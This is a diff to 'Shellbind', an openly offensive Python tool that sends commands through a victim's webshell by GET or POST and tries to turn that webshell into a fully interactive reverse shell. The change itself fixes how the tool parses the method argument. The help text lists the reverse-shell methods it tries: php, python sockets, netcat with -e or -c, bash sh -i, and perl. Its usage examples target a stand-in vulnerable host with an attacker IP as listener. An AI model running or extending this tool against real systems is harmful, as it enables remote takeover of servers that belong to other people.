@@ -14,7 +14,7 @@ import multiprocessing
 parser = argparse.ArgumentParser(description="Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.", epilog="Examples:\n-Semi interactive shell (no cd, su, etc.)\n\tshellbind.py -X POST -p cmd -u http://vuln.example/shell.php\n-Fully interactive shell with verbose output\n\tshellbind.py -p cmd -u http://vuln.example/shell.py -v -r auto:10.10.13.37:8080", formatter_class=argparse.RawTextHelpFormatter)
 
 parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True, nargs=1)
-parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used (Default: GET)", default="GET", nargs=1)
+parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used (Default: GET)", default=["GET"], nargs=1)
 parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked.\nExample: http://www.victim.com/vuln.php", required=True, nargs=1)
 parser.add_argument("-v", "--verbose", dest="debug", help="Verbose Output", action='store_true', default=False)
 parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a fully-interactive reverse shell.\nAvailable methods are:\n  auto - Try until a reverse shell binds\n  php - php reverseshell\n  py - python3 reverse shell with sockets\n  py2 - python2 reverse shell with sockets\n  nc1 - netcat reverse shell with -e flag\n  nc2 - netcat reverse shell with -c flag\n  bash - sh -i reverse shell\n  perl - perl reverse shell\nLHOST should be the ip that the victim can connect to\nThe port can be any unused port", metavar="METHOD:LHOST:PORT", nargs=1)
@@ -22,8 +22,8 @@ args = parser.parse_args()
 
 # Initilized listener and start trying reverse shell payloads
 def init_upgraded_shell():
-    args.method = args.method.upper()
-    if args.method not in ["GET", "POST"]:
+    args.method[0] = args.method[0].upper()
+    if args.method[0] not in ["GET", "POST"]:
         print(f"[!] Method {args.method} not recognized")
         sys.exit()
     try:
@@ -59,10 +59,10 @@ def back_call(payload_method, ip, port, payloads):
             try:
                 if args.debug:
                     print(f"[!] Trying: {payload}") 
-                if args.method == "GET":
+                if args.method[0] == "GET":
                     params = {args.para_name[0]: payload}
                     requests.get(args.host[0], params=params, timeout=timeout)
-                elif args.method == "POST":
+                elif args.method[0] == "POST":
                     params = {args.para_name[0]: payload}
                     requests.post(args.host[0], data=params, timeout=timeout)
                 time.sleep(1)
@@ -73,10 +73,10 @@ def back_call(payload_method, ip, port, payloads):
         try:
             if args.debug:
                 print(f"[!] Trying: {payload}") 
-            if args.method == "GET":
+            if args.method[0] == "GET":
                 params = {args.para_name[0]: payload}
                 requests.get(args.host[0], params=params, timeout=timeout)
-            elif args.method == "POST":
+            elif args.method[0] == "POST":
                 params = {args.para_name[0]: payload}
                 requests.post(args.host[0], data=params, timeout=timeout)
             time.sleep(1)
@@ -107,8 +107,8 @@ def interactive_shell(ip, port, child_process):
     
 
 def web_shell():
-    args.method = args.method.upper()
-    if args.method not in ["GET", "POST"]:
+    args.method[0] = args.method[0].upper()
+    if args.method[0] not in ["GET", "POST"]:
         print(f"[!] Method {args.method} not recognized")
         sys.exit()
     if args.debug:
@@ -116,7 +116,7 @@ def web_shell():
     while True:
         try:
             command = input("$ ")
-            if args.method == "GET":
+            if args.method[0] == "GET":
                 params = {args.para_name[0]: command}
                 res = requests.get(args.host[0], params=params)
             else:
